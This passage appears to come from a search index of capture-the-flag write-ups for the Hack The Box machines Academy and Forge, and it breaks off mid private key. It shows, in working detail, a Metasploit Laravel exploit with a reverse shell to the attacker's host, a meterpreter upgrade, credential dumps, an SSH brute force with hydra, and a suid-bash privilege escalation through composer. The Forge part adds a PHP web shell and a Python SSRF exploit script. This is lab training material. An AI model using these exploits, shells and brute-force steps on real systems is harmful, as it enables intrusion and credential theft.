SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\ SF:x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY0 SF:00\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDString, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPOptions SF:,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x SF:05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\" SF:\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1 SF:a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000 SF:\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0 SF:\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r SF:(ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Initiating NSE at 20:07 Completed NSE at 20:07, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.52 seconds Raw packets sent: 65647 (2.888MB) | Rcvd: 65535 (2.621MB) We see 3 open ports, 22 , 80 , and 33060 . Opening port 80 in Firefox gives us the following screen: There's a Login page: and a Registration page: Let's see what other pages are on the machine. My preferred tool for this is gobuster : gobuster dir --url=http://academy.htb -w /usr/share/wordlists/dirb/big.txt -x php,txt,Z,gz,zip =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://academy.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,Z,gz,zip [+] Timeout: 10s =============================================================== 2021/01/12 20:13:50 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htaccess.txt (Status: 403) /.htaccess.Z (Status: 403) /.htaccess.gz (Status: 403) /.htaccess.zip (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.Z (Status: 403) /.htpasswd.gz (Status: 403) /.htpasswd.zip (Status: 403) /admin.php (Status: 200) /config.php (Status: 200) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /login.php (Status: 200) /register.php (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/12 20:22:24 Finished =============================================================== So in addition to login.php and and register.php , there is an Admin page at admin.php , a configuration file at config.php , and a home.php that we're not authorized to see. Configuring the browser to send traffic through [ZAP](https://www.zaproxy.org) and submitting a registration allows us to log in: ZAP shows us the POST data sent to the web server. The fields look like what we filled out in the Registration page, with one addition: roleid=0 . We may be able to create an 'administrator' account if we set roleid=1 . Sending the POST data to ZAP's Request Editor allows us to edit roleid=1 and re-submit the post. We receive a 200 response code, which (hopefully) means the registration is successful. Attempting to log in with our newly created account on admin.php takes us to this page: Bingo! We've discovered a couple of new accounts: cry0l1t3 and mrb3n , as well as a virtual host we didn't know about before. Adding it to the entry for academy in /etc/hosts and visiting it in the browser yields a treasure trove of information (click for high resolution picture): Scrolling the bottom right pane, we see even more data: From this screen, we can discern a lot of information about the web server and what it's running: The web framework appears to be Laravel , a PHP web framework. The web server is Apache version 2.4.41 , and running on an Ubuntu OS. MySQL is running on the server, listening on port 3306 , and we see some possible credentials: homestead:secret . This may be the service listening on port 33060 as well. There are refernces to a Redis server on the host. The web application is installed in /var/www/html/htb-academy-dev-01 . We have part of the Laravel framework configuration exposed: the APP_KEY : base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=","title":"Reconnaissance"},{"location":"machines/Academy/#foothold","text":"The Laravel framework presents a good place to start looking for potential vulnerabilities. searching Exploit DB for laravel yields a few interesting results: The Metasploit vulnerability looks promising: it's relatively recent and has been verified. Firing up msfconsole and looking at the module info shows we need the remote host (RHOST) , the virtual server name (VHOST) , and the APP_KEY we found in the dump above. Let's give the module a try: msf6 > use exploit/unix/http/laravel_token_unserialize_exec [*] Using configured payload cmd/unix/reverse_perl msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0 LHOST => tun0 msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215 RHOSTS => 10.10.10.215 msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb VHOST => dev-staging-01.academy.htb msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf6 exploit(unix/http/laravel_token_unserialize_exec) > [*] Started reverse TCP handler on 10.10.14.251:4444 [*] Command shell session 1 opened (10.10.14.251:4444 -> 10.10.10.215:41432) at 2021-01-13 19:30:11 +0000 And there we have a session created. Let's upgrade it to a meterpreter session for more flexibility: msf6 exploit(unix/http/laravel_token_unserialize_exec) > use post/multi/manage/shell_to_meterpreter msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1 SESSION => 1 msf6 post(multi/manage/shell_to_meterpreter) > run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.10.14.251:4433 [*] Sending stage (976712 bytes) to 10.10.10.215 [*] Meterpreter session 2 opened (10.10.14.251:4433 -> 10.10.10.215:46886) at 2021-01-13 19:34:15 +0000 [*] Command stager progress: 100.00% (773/773 bytes) [*] Post module execution completed msf6 post(multi/manage/shell_to_meterpreter) > [*] Stopping exploit/multi/handler msf6 post(multi/manage/shell_to_meterpreter) > sessions 2 [*] Starting interaction with 2... meterpreter > meterpreter > getuid sServer username: www-data @ academy (uid=33, gid=33, euid=33, egid=33) meterpreter > sysinfo Computer : 10.10.10.215 OS : Ubuntu 20.04 (Linux 5.4.0-52-generic) Architecture : x64 BuildTuple : i486-linux-musl Meterpreter : x86/linux meterpreter > And there we have our foothold, a meterpreter session on the host, running as www-admin . We can grab the passwd file for information on other accounts to target: meterpreter > cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ... egre55:x:1000:1000:egre55:/home/egre55:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mrb3n:x:1001:1001::/home/mrb3n:/bin/sh cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 21y4d:x:1003:1003::/home/21y4d:/bin/sh ch4p:x:1004:1004::/home/ch4p:/bin/sh g0blin:x:1005:1005::/home/g0blin:/bin/sh egre55 , cry0l1t3 , and mrb3n we knew about, the last 3 are new. Let's go poke around in the web root. The Metasploit module we used mentions a .env file that Laravel uses to configure various settings, there may be others worth looking at. meterpreter > cd /var/www/html meterpreter > ls Listing: /var/www/html ====================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40755/rwxr-xr-x 4096 dir 2021-01-13 19:25:26 +0000 academy 40755/rwxr-xr-x 4096 dir 2020-08-13 12:40:29 +0000 htb-academy-dev-01 100644/rw-r--r-- 50 fil 2020-08-09 15:49:40 +0000 index.php meterpreter > cd academy meterpreter > ls Listing: /var/www/html/academy ============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 706 fil 2020-08-13 12:42:01 +0000 .env 100644/rw-r--r-- 651 fil 2020-08-09 15:49:40 +0000 .env.example 100644/rw-r--r-- 111 fil 2020-08-09 15:49:40 +0000 .gitattributes 100644/rw-r--r-- 155 fil 2020-08-09 15:49:40 +0000 .gitignore 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 app 100755/rwxr-xr-x 1686 fil 2020-08-09 15:49:40 +0000 artisan 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 bootstrap 100644/rw-r--r-- 1512 fil 2020-08-09 15:49:40 +0000 composer.json 100644/rw-r--r-- 191621 fil 2020-08-09 15:49:40 +0000 composer.lock 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 config 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 database 100644/rw-r--r-- 2956188 fil 2021-01-13 19:26:47 +0000 hehe 100644/rw-r--r-- 1150 fil 2020-08-09 15:49:40 +0000 package.json 100644/rw-r--r-- 1040 fil 2020-08-09 15:49:40 +0000 phpunit.xml 40755/rwxr-xr-x 4096 dir 2021-01-13 17:21:07 +0000 public 100644/rw-r--r-- 3622 fil 2020-08-09 15:49:40 +0000 readme.md 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 resources 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 routes 100644/rw-r--r-- 563 fil 2020-08-09 15:49:40 +0000 server.php 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 storage 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 tests 40755/rwxr-xr-x 4096 dir 2020-08-09 15:49:40 +0000 vendor 100644/rw-r--r-- 549 fil 2020-08-09 15:49:40 +0000 webpack.mix.js meterpreter > cat .env APP_NAME=Laravel APP_ENV=local APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_DEBUG=false APP_URL=http://localhost LOG_CHANNEL=stack DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!! BROADCAST_DRIVER=log CACHE_DRIVER=file SESSION_DRIVER=file SESSION_LIFETIME=120 QUEUE_DRIVER=sync REDIS_HOST=127.0.0.1 REDIS_PASSWORD=null REDIS_PORT=6379 MAIL_DRIVER=smtp MAIL_HOST=smtp.mailtrap.io MAIL_PORT=2525 MAIL_USERNAME=null MAIL_PASSWORD=null MAIL_ENCRYPTION=null PUSHER_APP_ID= PUSHER_APP_KEY= PUSHER_APP_SECRET= PUSHER_APP_CLUSTER=mt1 MIX_PUSHER_APP_KEY=\"${PUSHER_APP_KEY}\" MIX_PUSHER_APP_CLUSTER=\"${PUSHER_APP_CLUSTER}\" That's a new password: mySup3rP4s5w0rd!! . Also, when we did our gobuster dir of the main academy.htb website, we saw the file config.php . We should go see what is in that as well: meterpreter > cd public meterpreter > ls Listing: /var/www/html/academy/public ===================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40755/rwxr-xr-x 4096 dir 2020-11-05 12:23:01 +0000 Modules_files 100644/rw-r--r-- 1600 fil 2020-08-11 00:55:16 +0000 admin-page.php 100644/rw-r--r-- 3247 fil 2020-08-12 21:28:32 +0000 admin.php 100644/rw-r--r-- 174 fil 2020-08-09 16:55:09 +0000 config.php 100644/rw-r--r-- 55036 fil 2020-11-09 10:13:59 +0000 home.php 40755/rwxr-xr-x 4096 dir 2020-09-14 22:38:21 +0000 images 100644/rw-r--r-- 2117 fil 2020-09-14 22:40:07 +0000 index.php 100644/rw-r--r-- 3185 fil 2020-08-12 21:28:52 +0000 login.php 100644/rw-r--r-- 4304 fil 2020-11-05 12:51:00 +0000 register.php 100644/rw-r--r-- 5494 fil 2021-01-13 17:21:07 +0000 shell.php 100644/rw-r--r-- 685 fil 2020-11-05 12:51:19 +0000 success-page.php meterpreter > cat config.php <?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $ link = mysqli_connect ( 'localhost' , 'root' , 'GkEWXn4h34g8qx9fZ1' , 'academy' ) ; ?> Another possible password: GkEWXn4h34g8qx9fZ1 .","title":"Foothold"},{"location":"machines/Academy/#user","text":"It's a well-used adage in Security that people are lazy. If they can get away with it, they'll re-use passwords EVERYWHERE . Now that we have a few usernames and some possible passwords, we should try using a tool to brute-force combinations and see if we get any hits. My personal favorite for testing passwords against an SSH server is THC Hydra . We create a list of users: jra@kali:~/htb/Machines/Academy$ cat users.txt egre55 mrb3n cry0l1t3 root 21y4d ch4p g0blin And passwords: jra@kali:~/htb/Machines/Academy$ cat passwords.txt mySup3rP4s5w0rd!! secret GkEWXn4h34g8qx9fZ1 We can feed these files to hydra to check for hits. A couple of comments on the flags to hydra : -t 4 sets the number of concurrent threads to be 4 . Some services will throttle or ban too many attempts at a time. The -e flag adds some additional checks: s - try the login as password n - try an empty password r - reverse the login and try it as password jra@kali:~/htb/Machines/Academy$ hydra -L users.txt -P passwords.txt -t 4 -e snr ssh://academy.htb Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 20:15:02 [DATA] max 4 tasks per 1 server, overall 4 tasks, 42 login tries (l:7/p:6), ~11 tries per task [DATA] attacking ssh://academy.htb:22/ [22][ssh] host: academy.htb login: cry0l1t3 password: mySup3rP4s5w0rd!! 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-13 20:15:33 We can log in to academy as cry0l1t3 and get the User flag: jra@kali:~/htb/Machines/Academy$ ssh cry0l1t3@academy.htb cry0l1t3@academy.htb's password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information disabled due to load higher than 2.0 0 updates can be installed immediately. 0 of these updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Jan 13 19:29:30 2021 from 10.10.14.106 $ ls user.txt $ cat user.txt 569bd4717e889c4ba19266c3790ac81e (Your flag may be different, as the flags change over time)","title":"User"},{"location":"machines/Academy/#root","text":"Now we have a shell as a regular user on the box. We can try a couple of obvious paths to root: $ sudo -l [sudo] password for cry0l1t3: Sorry, user cry0l1t3 may not run sudo on academy. $ su - Password: su: Authentication failure $ cat /root/root.txt cat: /root/root.txt: Permission denied But we get bupkis. Uploading and running linPEAS does give us something interesting to take a look at: We're a member of group adm , which isn't a common thing for normal users. Members of the 'adm' group have read access into the logs in /var/log . From the linPEAS output, we see that there are some files in /var/log that look like they might contain interesting information: These are output from auditd , an overview of which is linked here . From the auditd man page: auditd is the userspace component to the Linux Auditing System. It's responsible for writing audit records to the disk. Viewing the logs is done with the ausearch or aureport utilities. Using the ausearch tool, we can dump the audit logs and search for interesting things. I found it easiest to run ausearch -i -if /path/to/audit/file and then use grep to look for interesting things. -i tells ausearch to 'interpret' the data in the logs, such as converting numeric UIDs to usernames. -if /path/name specifies the path of file to read. Starting at the oldest file and working forwards, running ausearch -i -if /var/log/audit/audit.log.3 | grep cry0l1t3 | less , we can find an interesting set of lines: type=TTY msg=audit(08/12/2020 02:28:10.086:83) : tty pid=2517 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=sh data=\"su mrb3n\",<nl> type=TTY msg=audit(08/12/2020 02:28:13.906:84) : tty pid=2520 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=su data=\"mrb3n_Ac@d3my!\",<nl> Verifying the password works, we now have a shell as mrb3n , and mrb3n can run the command /usr/bin/composer as root : cry0l1t3@academy:~$ su - mrb3n Password: $ id uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) $ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer Composer is a dependency manager for PHP modules. In-depth documentation is available on the Composer website. Composer is controlled via a config file named composer.json , and the feature we're interested in is the ability to define arbitrary scripts that can be excuted from the composer command line. We can get very complex with our scripts, or go simple. This composer.json creates a suid-root copy of /bin/bash in the directory /tmp/.pug : { \"name\" : \"pugpug/pugpug\" , \"description\" : \"Pugpug Hacks.\" , \"license\" : \"MIT\" , \"type\" : \"project\" , \"scripts\" : { \"pugpug\" : [ \"mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash\" ] } } Running sudo composer run-script pugpug will execute the script as root , and we're left with a suid-root copy of bash in /tmp/.pug : mrb3n@academy:/tmp/.pug$ cat composer.json { \"name\": \"pugpug/pugpug\", \"description\": \"Pugpug Hacks.\", \"license\": \"MIT\", \"type\": \"project\", \"scripts\": { \"pugpug\": [ \"mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash\" ] } } mrb3n@academy:/tmp/.pug$ sudo composer run-script pugpug [sudo] password for mrb3n: PHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 Do not run Composer as root/super user! See https://getcomposer.org/root for details > mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash mrb3n@academy:/tmp/.pug$ ls -l total 1160 -rwsr-xr-x 1 root root 1183448 Jan 14 00:01 bash -rw-r--r-- 1 mrb3n mrb3n 258 Jan 14 00:00 composer.json (Note the warning about not running Composer as root) We can run our malicious copy of bash with /tmp/.pug/bash -p , and get a root shell: mrb3n@academy:/tmp/.pug$ /tmp/.pug/bash -p bash-5.0# id uid=1001(mrb3n) gid=1001(mrb3n) euid=0(root) groups=1001(mrb3n) bash-5.0# cat /root/root.txt 00d08ac7120264dfc58d360503211699 And that's the Root flag.","title":"Root"},{"location":"machines/Academy/#final-thoughts","text":"This was a fun box. I'm always impressed with egre55's machines, they're well developed and have plausible holes and exploits. I can see how in the 'real world' these types of configurations are possible, and how unintended side-effects can lead to greater compromise. -- pugpug","title":"Final thoughts"},{"location":"machines/Forge/","text":"Forge (Linux Medium) # Forge is a medium-rated Linux machine by NoobHacker99 . We'll exploit two Server-Side Request FORGEry vulnerabilities to gain access to an internal-only FTP server with an ssh private key for access to the machine. To gain root, we'll break a Python script and use the Python debugger to execute a shell. Reconnaissance # An initial nmap scan shows only 3 ports open: 21, 22, and 80: # nmap -v -n -p- -Pn -sS -O -oA forge-alltcp 10 .10.11.111 Nmap scan report for 10.10.11.111 Host is up (0.048s latency). Not shown: 65532 closed ports PORT STATE SERVICE 21/tcp filtered ftp 22/tcp open ssh 80/tcp open http The FTP service is listed as filtered , most likely by an iptables rule to block traffic not from the local host. Scanning the services doesn't reveal much either: # nmap -n -v -p 22 ,80 -sCV -Pn -oA forge-services 10 .10.11.111 Nmap scan report for 10.129.204.175 Host is up (0.035s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://forge.htb Service Info: Host: 10.129.204.175; OS: Linux; CPE: cpe:/o:linux:linux_kernel The OpenSSH and apache versions indicate this is likely an Ubuntu 20.04 machine. The redirect to http://forge.htb is noteworthy, indicating we should check for other named-based virtual hosts on the web server. My preferred tool for this is wfuzz : $ wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.forge.htb' http://10.10.11.111 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.11.111/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 302 9 L 26 W 279 Ch \"www\" 000000012: 302 9 L 26 W 279 Ch \"ns2\" 000000011: 302 9 L 26 W 279 Ch \"ns1\" 000000014: 302 9 L 26 W 286 Ch \"autoconfig\" 000000003: 302 9 L 26 W 279 Ch \"ftp\" ^C I'll run an initial fuzz to see how the web server responds, then run it again and filter out the negative results. In this instance, we can filter out responses with a word count of 26 words: $ wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.forge.htb' --hw 26 http://10.10.11.111 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.11.111/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000024: 200 1 L 4 W 27 Ch \"admin\" 000009532: 400 12 L 53 W 425 Ch \"#www\" 000010581: 400 12 L 53 W 425 Ch \"#mail\" Total time: 83.94768 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 237.8386 wfuzz shows there is a website at http://admin.forge.htb as well. After adding 10.10.11.111 forge.htb admin.forge.htb to /etc/hosts , we can view the site in a browser: The 'Upload an image' link takes us to a web form where we can either upload a file from our local machine, or input an URL that the server will use to download an image for us. If not implemented correctly, this type of service can be abused to access resources that might not be directly accessible. Attemping to access the admin site is unsuccessful, but does provide a valuable clue: we can access the site from requests sent from the local machine. That gives us our path forward: finding a way to coerce the upload function into sending requests to the services on the local machine that are blocked to outside requests. Foothold # We'll begin with attempting to learn how the upload function behaves. We can start a netcat listener on a port, then put our IP address in the upload function to see whether the site will attempt to contact us: $ nc -vnlp 8008 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::8008 Ncat: Listening on 0.0.0.0:8008 Upon submitting the request, we get a response in our netcat listener: $ nc -vnlp 8008 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::8008 Ncat: Listening on 0.0.0.0:8008 Ncat: Connection from 10.10.11.111. Ncat: Connection from 10.10.11.111:51044. GET /pugpug HTTP/1.1 Host: 10.10.14.8:8008 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive ^C By starting a Python web server, we can see how the application behaves when we send a valid file: $ cat pug.php <?php echo \"<pre>\"; system($_GET[cmd]); ?> $ python3 -m http.server 8008 Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ... 10.10.11.111 - - [22/Jan/2022 15:46:07] \"GET /pug.php HTTP/1.1\" 200 - We see in the response from the web server that it saves our data to a random filename: Fetching the URL returns the content of the transferred file: $ curl http://forge.htb/uploads/9q7dl5j6hFE25xaSgSwV <?php echo \"<pre>\"; system($_GET[cmd]); ?> User # As we'll be poking at the website to determine how to leverage the SSRF vulnerability, I'll write a quick script to quickly send requests to the server and fetch the results. While it's possible to perform this either through the browser or via an attack proxy such as Burp, my preference is to create scripts to make the process easier. #!/usr/bin/env python3 # Exploit the SSRF vulnerability on forge.htb to retrieve data from # internal services. # # Joe Ammond (pugpug) import requests from cmd import Cmd from bs4 import BeautifulSoup url = 'http://forge.htb/upload' # Abuse the SSRF on the main site def fetch ( args ): data = { 'url' : args , 'remote' : '1' } # POST request r = requests . post ( url , data = data ) # Parse initial response, find href to upload URL, get it. Finding the # uploaded URL is ugly. We wrap it in a try/except in case we hit the # filter or the the request fails. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : return r . text r = requests . get ( data ) return r . text class Term ( Cmd ): prompt = 'url> ' def default ( self , args ): print ( fetch ( args )) if __name__ == '__main__' : term = Term () term . cmdloop () The upload function accepts an HTTP POST request, with two required parameters: url , the URL for the server to process, and remote , which is set to 1 to specify a remote file. We send the entered URL to the upload service and process the results. If the request is successful, we parse out the URL where the data has been written to, fetch it and return the content. In the event of a failed request, we return the response from the POST to see any errors. Running the script and entering the same URL as the screenshot above shows the script is working: $ python3 ssrf-base.py url> http://10.10.14.8:8008/pug.php <?php echo \"<pre>\"; system($_GET[cmd]); ?> url> Attemping to access either the admin site or the FTP server results in errors: url> http://admin.forge.htb ... <center> <strong>URL contains a blacklisted address!</strong> </center> ... url> ftp://127.0.0.1/ ... <center> <strong>Invalid protocol! Supported protocols: http, https</strong> </center> ... After trying some different filter bypass techniques, on a whim I attempted entering the hostname in uppercase. Success: url> http://ADMIN.FORGE.HTB <!DOCTYPE html> <html> <head> <title>Admin Portal</title> </head> <body> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"> <header> <nav> <h1 class=\"\"><a href=\"/\">Portal home</a></h1> <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1> <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1> </nav> </header> <br><br><br><br> <br><br><br><br> <center><h1>Welcome Admins!</h1></center> </body> </html> The /announcements URL gives us the next part of getting to user: url> http://ADMIN.FORGE.HTB/announcements ... <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li> <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li> <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li> ... Attemping to use the credentials to access the machine via SSH fails: $ ssh user@forge.htb user@forge.htb: Permission denied (publickey). However, it looks like we can use the SSRF vulnerability on the main page to access the /upload URL on the admin site, which may give us access to the internal FTP server. We can modify the fetch() function to route any URLs through the admin site: # Abuse the SSRF on the main site, routing the request to admin.forge.htb, # as the admin site accepts more request types. def fetch ( args ): data = { 'url' : 'http://ADMIN.FORGE.HTB/upload?u= {} ' . format ( args ), 'remote' : '1' } # POST request r = requests . post ( url , data = data ) # Parse initial response, find href to upload URL, get it. Finding the # uploaded URL is ugly. We wrap it in a try/except in case we hit the # filter or the the request fails. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : return r . text r = requests . get ( data ) # Parse the second page returned, to see whether the request from # admin was successful. soup = BeautifulSoup ( r . text , 'html.parser' ) try : data = soup . find_all ( 'strong' )[ 1 ] . text except : # We couldn't parse it as HTML, so return the text directly return r . text # We got a second link in the returned page, so fetch it and return # the content. r = requests . get ( data ) return r . text After modifying the script, we can see whether the /upload function on the admin site has any additional functionality. Attempting a file:/// URL shows that in addition to HTTP and HTTPS , we can now access FTP and FTPS URLs as well: $ python ssrf.py url> file:///etc/passwd Invalid protocol! Supported protocols: http, https, ftp, ftps. url> We can access the internal FTP server using the credentials provided and grab user.txt : url> ftp://user:heightofsecurity123!@FORGE.HTB/ drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Jan 22 20:07 user.txt url> ftp://user:heightofsecurity123!@FORGE.HTB/user.txt 737124c79df00af1e2bec4... url> The snap directory is an indication that we have accessed the home directory of the user account. Since we know we can't use password authentication with SSH , we can look for a .ssh directory, which may contain a private key: url> ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/ -rw------- 1 1000 1000 564 May 31 2021 authorized_keys -rw------- 1 1000 1000 2590 May 20 2021 id_rsa -rw------- 1 1000 1000 564 May 20 2021 id_rsa.pub url> ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE 